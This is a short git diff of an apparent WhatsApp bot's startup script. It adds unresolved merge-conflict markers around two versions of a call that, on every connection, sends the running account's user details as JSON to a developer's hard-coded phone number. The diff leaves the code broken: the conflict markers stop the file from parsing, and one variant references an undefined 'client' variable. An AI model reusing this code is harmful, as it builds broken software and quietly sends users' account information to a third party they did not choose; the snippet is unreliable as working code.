@@ -44,7 +44,11 @@ global.DATABASE = global.db // Backwards Compatibility
 global.conn = new WAConnection()
 conn.version = [2, 2143, 3]
 conn.browserDescription = ["Subscribe Brutal", "Chrome", "3.0"];
+<<<<<<< HEAD
 conn.sendMessage(`919101765679@s.whatsapp.net`, `*Hi Owner Brutal, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(conn.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, ★彡[ʙᴏᴛ ᴏꜰ ʙʀᴜᴛᴀʟ]彡★*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Brutal Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/919101765679?text=Hello bro"}}})
+=======
+conn.sendMessage(`919101765679@s.whatsapp.net`, `*Hi Owner Brutal, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, ★彡[ʙᴏᴛ ᴏꜰ ʙʀᴜᴛᴀʟ]彡★*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Brutal Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/919101765679?text=Hello bro"}}})
+>>>>>>> f2ab2aeb4cf28fded3b1682005d1c676ed06f975
   console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 let authFile = `${opts._[0] || 'session'}.data.json`
 if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
